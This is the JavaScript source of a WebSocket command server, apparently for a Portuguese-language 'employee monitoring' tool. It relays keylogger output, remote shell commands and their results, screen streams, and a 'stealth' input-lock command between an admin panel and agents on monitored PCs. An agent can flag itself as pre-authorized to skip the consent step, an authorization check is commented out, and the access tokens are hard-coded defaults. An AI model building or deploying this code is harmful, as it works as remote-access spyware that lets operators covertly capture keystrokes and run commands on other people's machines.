import express from "express";
import http from "http";
import crypto from "crypto";
import { WebSocketServer, WebSocket } from "ws";

const PORT = Number(process.env.PORT || 8080);
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || "troque-admin";
const AGENT_KEY = process.env.AGENT_KEY || "troque-agent";
const MAX_ADMIN_BUFFER = 2 * 1024 * 1024;

const app = express();
app.get("/", (_req, res) => res.json({ status: "ok", service: "EmpresaMonitor Realtime V3.1 Single Consent" }));
app.get("/health", (_req, res) => res.json({ status: "ok", time: new Date().toISOString() }));

const server = http.createServer(app);
const wss = new WebSocketServer({ server, maxPayload: 12 * 1024 * 1024, perMessageDeflate: false });
const agents = new Map();
const admins = new Set();

function send(ws, obj) { if (ws?.readyState === WebSocket.OPEN) ws.send(JSON.stringify(obj)); }
function summary(a) { return { id:a.id,name:a.name,user:a.user,accessActive:!!a.active,controlActive:!!a.controlActive,watchers:a.watchers.size,version:a.version||"" }; }
function broadcast() { const list=[...agents.values()].map(summary); for(const a of admins) send(a,{type:"agent_list",agents:list}); }
function stopIfUnused(a){ if(a.watchers.size===0) send(a.ws,{type:"stream_stop"}); }

wss.on("connection", ws => {
  ws.id=crypto.randomUUID(); ws.role="unknown"; ws.selectedAgentId=null;
  console.log(`[INFO] Nova conexão WebSocket: ${ws.id} (Role: unknown)`);

  ws.on("message", (data, isBinary) => {
    const rawMsg = data.toString();
    console.log(`[DEBUG] Mensagem recebida de ${ws.role}: ${rawMsg.substring(0, 60)}...`);

    if(isBinary){
      if(ws.role!=="agent"||!ws.agentId) {
        console.log("[ERRO] Binário recebido de conexão sem role de agente");
        return;
      }
      const a=agents.get(ws.agentId); if(!a||!a.active)return;
      for(const admin of a.watchers){
        if(admin.readyState!==WebSocket.OPEN||admin.selectedAgentId!==a.id)continue;
        if(admin.bufferedAmount > MAX_ADMIN_BUFFER) continue;
        admin.send(data,{binary:true});
      }
      return;
    }
    
    let msg; try{msg=JSON.parse(data.toString());}catch(e){
      console.log("[ERRO] Falha ao parsear JSON:", e.message);
      return;
    }

    // --- TRATAMENTO PARA ADMIN ---
    if(msg.type==="admin_hello"){
      if(msg.token!==ADMIN_TOKEN){send(ws,{type:"error",message:"ADMIN_TOKEN inválida"});ws.close();return;}
      ws.role="admin"; admins.add(ws); console.log("[INFO] Admin conectado");
      send(ws,{type:"admin_ready",agents:[...agents.values()].map(summary)}); return;
    }

    if(ws.role==="admin"){
      const a=agents.get(String(msg.agentId||""));
      if(!a) return send(ws, {type: "error", message: "Computador não encontrado"});

      // --- TRAVA DE SEGURANÇA COMENTADA PARA TESTES ---
      /* 
      if (ws.selectedAgentId !== a.id) {
          return send(ws, {type: "error", message: "Você precisa estar assistindo este agente"});
      }
      */

      if(msg.type==="request_access"){if(!a)return; send(a.ws,{type:"access_request"});return;}
      if(msg.type==="request_control"){if(!a||!a.active)return; send(a.ws,{type:"control_request"});return;}
      
      // --- NOVOS COMANDOS DO ADMIN (STEALTH & LOCK) ---
      if(msg.type==="input_lock"){
        send(a.ws,{type:"input_lock", active: msg.active});
        return;
      }

      if(msg.type==="shell_cmd"){
        send(a.ws,{type:"shell_cmd", cmd: msg.cmd});
        return;
      }

      if(msg.type==="set_profile"){
        if(!a)return; const profile=["fluid","balanced","quality"].includes(msg.profile)?msg.profile:"balanced";
        send(a.ws,{type:"stream_profile",profile}); return;
      }
      if(msg.type==="watch"){
        const id=String(msg.agentId||"");
        if(ws.selectedAgentId){const old=agents.get(ws.selectedAgentId);if(old){old.watchers.delete(ws);stopIfUnused(old);}}
        const next=agents.get(id);if(!next)return;ws.selectedAgentId=id;next.watchers.add(ws);if(next.active)send(next.ws,{type:"stream_start"});broadcast();return;
      }
      if(msg.type==="control_input"){
        if(!a.controlActive)return;
        send(a.ws,{type:"control_input",event:msg.event});return;
      }
      if(msg.type==="end_control"){if(!a)return;a.controlActive=false;broadcast();return;}
      if(msg.type==="end_access"){if(!a)return;a.active=false;a.controlActive=false;send(a.ws,{type:"access_ended"});send(a.ws,{type:"stream_stop"});broadcast();return;}
    }

    // --- TRATAMENTO PARA AGENTE ---
    if(ws.role==="agent"){
      const a=agents.get(ws.agentId); if(!a)return;

      if(msg.type === "keylog") {
          for(const admin of a.watchers){
              if(admin.readyState === WebSocket.OPEN && admin.selectedAgentId === a.id){
                  send(admin, msg); 
              }
          }
          return;
      }

      if(msg.type === "lock_ack"){
        for(const admin of a.watchers){
            if(admin.readyState === WebSocket.OPEN && admin.selectedAgentId === a.id){
                send(admin, msg);
            }
        }
        return;
      }

      if(msg.type === "shell_result"){
        for(const admin of a.watchers){
            if(admin.readyState === WebSocket.OPEN && admin.selectedAgentId === a.id){
                send(admin, msg);
            }
        }
        return;
      }

      if(msg.type==="access_response"){
        a.active=msg.allow===true;if(!a.active)a.controlActive=false;
        if(a.active&&a.watchers.size>0)send(a.ws,{type:"stream_start"});else if(!a.active)send(a.ws,{type:"stream_stop"});broadcast();return;
      }
      if(msg.type==="control_response"){a.controlActive=a.active&&msg.allow===true;broadcast();return;}
      if(msg.type==="end_control"){a.controlActive=false;broadcast();return;}
      if(msg.type==="end_access"){a.active=false;a.controlActive=false;send(a.ws,{type:"stream_stop"});broadcast();return;}
    }

    // --- SETUP INICIAL DO AGENTE ---
    if(msg.type==="agent_hello"){
      if(msg.key!==AGENT_KEY){
        console.log("[ERRO] AgentKey inválida!");
        send(ws,{type:"error",message:"AGENT_KEY inválida"});ws.close();return;
      }
      ws.role="agent"; ws.agentId=String(msg.id||crypto.randomUUID());
      console.log(`[INFO] Agente identificado: ${ws.agentId}`);
      const old=agents.get(ws.agentId); if(old?.ws&&old.ws!==ws) try{old.ws.close();}catch{}
      const preAuthorized = msg.sessionAuthorized === true;
      agents.set(ws.agentId,{ws,id:ws.agentId,name:String(msg.name||"PC"),user:String(msg.user||""),version:String(msg.version||""),active:preAuthorized,controlActive:preAuthorized,watchers:new Set()});
      send(ws,{type:"agent_ready",id:ws.agentId}); broadcast(); return;
    }
  });

  ws.on("close",()=>{
    console.log(`[INFO] Conexão fechada: ${ws.id}`);
    if(ws.role==="admin"){
        admins.delete(ws);
        if(ws.selectedAgentId){
            const a=agents.get(ws.selectedAgentId);
            if(a){a.watchers.delete(ws);stopIfUnused(a);}
        }
        broadcast();
        return;
    }
    if(ws.role==="agent"&&ws.agentId){
        const a=agents.get(ws.agentId);
        if(a?.ws===ws){agents.delete(ws.agentId);broadcast();}
    }
  });
});

server.listen(PORT,"0.0.0.0",()=>console.log(`EmpresaMonitor Realtime V3.1 listening on ${PORT}`));
